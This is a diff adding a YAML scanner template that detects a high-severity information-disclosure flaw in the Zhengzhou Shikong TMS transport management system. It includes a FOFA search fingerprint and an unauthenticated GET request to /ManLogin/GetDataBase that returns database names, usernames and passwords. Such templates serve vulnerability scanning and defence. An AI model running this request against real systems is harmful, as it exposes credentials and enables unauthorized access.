@@ -1,0 +1,22 @@
+id: zzsk-wms-getdatabase-disclosure
+
+info:
+  name: 郑州时空-TMS运输管理系统 GetDataBase 信息泄露
+  author: zan8in
+  severity: high
+  verified: true
+  description: |-
+    郑州时空-TMS运输管理系统 GetDataBase 接口存在信息泄露漏洞，未经身份验证攻击者可通过该漏洞读取系统内部数据库文件，泄露账号密码等重要凭证，导致网站处于极度不安全状态。
+    fofa: body="/Images/ManLogin/name.png"
+  reference:
+    - https://mp.weixin.qq.com/s/hXWIjVy6egQV15bOHMvDXw
+  tags: zzsk,disclouse
+  created: 2025/01/02
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /ManLogin/GetDataBase
+    expression: response.status == 200 && response.body.bcontains(b'"dataname":') && response.body.bcontains(b'"datausername":') && response.body.bcontains(b'"datauserpwd":')
+expression: r0()
